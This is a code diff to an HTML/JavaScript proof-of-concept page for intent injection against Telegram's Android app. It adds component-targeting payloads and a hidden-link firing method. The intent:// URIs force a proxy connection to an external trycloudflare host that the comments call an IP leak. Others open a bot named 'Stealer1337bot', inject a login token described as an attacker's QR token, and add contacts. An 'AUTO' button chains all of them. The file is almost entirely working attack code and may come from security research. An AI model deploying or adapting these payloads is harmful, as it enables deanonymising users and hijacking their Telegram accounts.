@@ -68,9 +68,24 @@
     </button>
     <div class="label">intent:// → tg://addcontact?phone=... — forces contact add dialog</div>
 
+    <hr style="margin:8px 0;border:none;border-top:1px solid #eee">
+    <p style="font-size:12px;color:#888;margin-bottom:8px">Method B: Component targeting (same-app bypass)</p>
+
+    <button class="btn" style="background:#555" onclick="fire('proxy',true)">
+      B1: Proxy (component)
+    </button>
+    <button class="btn" style="background:#555" onclick="fire('resolve',true)">
+      B2: Resolve Bot (component)
+    </button>
+    <button class="btn" style="background:#555" onclick="fire('login',true)">
+      B3: Login Token (component)
+    </button>
+
+    <hr style="margin:8px 0;border:none;border-top:1px solid #eee">
+
     <!-- Auto-fire test (for 1-click chain) -->
     <button class="btn red" onclick="autoFire()">
-      AUTO: Chain all tests (2s delay each)
+      AUTO: Chain all tests (3s delay each)
     </button>
   </div>
   <div id="log">Intent Injection PoC loaded.\n</div>
@@ -96,46 +111,64 @@ function send(text) {
 }
 
 // Craft intent:// URIs for each test
+// Note: & chars in query are fine before #Intent delimiter
+// Intent.parseUri splits on "#Intent;" - everything before is the data URI
 var payloads = {
-  // Test 1: Proxy - should trigger auto-connect (IP leak) before confirmation
-  proxy: 'intent://proxy?server=brings-popularity-elsewhere-libraries.trycloudflare.com%26port=443%26secret=dd00000000000000000000000000000000#Intent;scheme=tg;action=android.intent.action.VIEW;end',
+  // METHOD A: intent filter matching (action=VIEW + scheme=tg)
+
+  // Test 1: Proxy - should trigger auto-connect (IP leak)
+  proxy: 'intent://proxy?server=brings-popularity-elsewhere-libraries.trycloudflare.com&port=443&secret=dd00000000000000000000000000000000#Intent;scheme=tg;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end',
 
   // Test 2: Resolve bot - should open our bot's mini app
-  resolve: 'intent://resolve?domain=Stealer1337bot%26startapp=x%26start=auto#Intent;scheme=tg;action=android.intent.action.VIEW;end',
+  resolve: 'intent://resolve?domain=Stealer1337bot&startapp=x&start=auto#Intent;scheme=tg;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end',
 
-  // Test 3: Join group - AAAAAEX is a dummy invite hash
-  join: 'intent://join?invite=AAAAAEX_test#Intent;scheme=tg;action=android.intent.action.VIEW;end',
+  // Test 3: Join group
+  join: 'intent://join?invite=AAAAAEX_test#Intent;scheme=tg;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end',
 
-  // Test 4: Login token - dummy base64 token (in real attack, this would be attacker's QR token)
-  login: 'intent://login?token=dGVzdF90b2tlbl9mb3JfcG9j#Intent;scheme=tg;action=android.intent.action.VIEW;end',
+  // Test 4: Login token - dummy base64url token (in real attack = attacker's QR token)
+  login: 'intent://login?token=dGVzdF90b2tlbl9mb3JfcG9j#Intent;scheme=tg;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end',
 
   // Test 5: Add contact
-  contact: 'intent://addcontact?phone=%2B15551234567%26first_name=Evil%26last_name=Hacker#Intent;scheme=tg;action=android.intent.action.VIEW;end'
+  contact: 'intent://addcontact?phone=+15551234567&first_name=Evil&last_name=Hacker#Intent;scheme=tg;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end'
 };
 
-// Alternative payloads using component targeting (bypass intent filter matching)
+// METHOD B: explicit component targeting (same-app can launch own activities)
 var payloads_component = {
-  proxy: 'intent://proxy?server=brings-popularity-elsewhere-libraries.trycloudflare.com%26port=443%26secret=dd00000000000000000000000000000000#Intent;scheme=tg;component=org.telegram.messenger.web/org.telegram.ui.LaunchActivity;end',
-  resolve: 'intent://resolve?domain=Stealer1337bot%26startapp=x#Intent;scheme=tg;component=org.telegram.messenger.web/org.telegram.ui.LaunchActivity;end',
+  proxy: 'intent://proxy?server=brings-popularity-elsewhere-libraries.trycloudflare.com&port=443&secret=dd00000000000000000000000000000000#Intent;scheme=tg;component=org.telegram.messenger.web/org.telegram.ui.LaunchActivity;end',
+  resolve: 'intent://resolve?domain=Stealer1337bot&startapp=x#Intent;scheme=tg;component=org.telegram.messenger.web/org.telegram.ui.LaunchActivity;end',
   join: 'intent://join?invite=AAAAAEX_test#Intent;scheme=tg;component=org.telegram.messenger.web/org.telegram.ui.LaunchActivity;end',
   login: 'intent://login?token=dGVzdF90b2tlbl9mb3JfcG9j#Intent;scheme=tg;component=org.telegram.messenger.web/org.telegram.ui.LaunchActivity;end',
-  contact: 'intent://addcontact?phone=%2B15551234567%26first_name=Evil%26last_name=Hacker#Intent;scheme=tg;component=org.telegram.messenger.web/org.telegram.ui.LaunchActivity;end'
+  contact: 'intent://addcontact?phone=+15551234567&first_name=Evil&last_name=Hacker#Intent;scheme=tg;component=org.telegram.messenger.web/org.telegram.ui.LaunchActivity;end'
 };
 
-function fire(test) {
-  log('Firing: ' + test);
-  send('Intent inject test: ' + test + '\nPayload: ' + payloads[test]);
+function fire(test, useComponent) {
+  var p = useComponent ? payloads_component : payloads;
+  var method = useComponent ? 'component' : 'intent-filter';
+  log('Firing [' + method + ']: ' + test);
+  send('Intent inject [' + method + ']: ' + test + '\nPayload: ' + p[test]);
 
-  // Try intent filter matching first
-  var url = payloads[test];
-  log('URL: ' + url);
+  var url = p[test];
+  log('URL: ' + url.substring(0, 80) + '...');
 
-  // Method 1: window.location
+  // Method 1: <a> tag click (triggers shouldOverrideUrlLoading)
   try {
-    log('Trying window.location...');
-    window.location = url;
+    log('Method: <a>.click()');
+    var a = document.createElement('a');
+    a.href = url;
+    a.style.display = 'none';
+    document.body.appendChild(a);
+    a.click();
+    setTimeout(function() { a.remove(); }, 100);
+    log('Fired via <a>.click()');
   } catch(e) {
-    log('location failed: ' + e.message);
+    log('<a>.click() failed: ' + e.message);
+    // Method 2: window.location
+    try {
+      log('Fallback: window.location');
+      window.location = url;
+    } catch(e2) {
+      log('location failed: ' + e2.message);
+    }
   }
 }
 
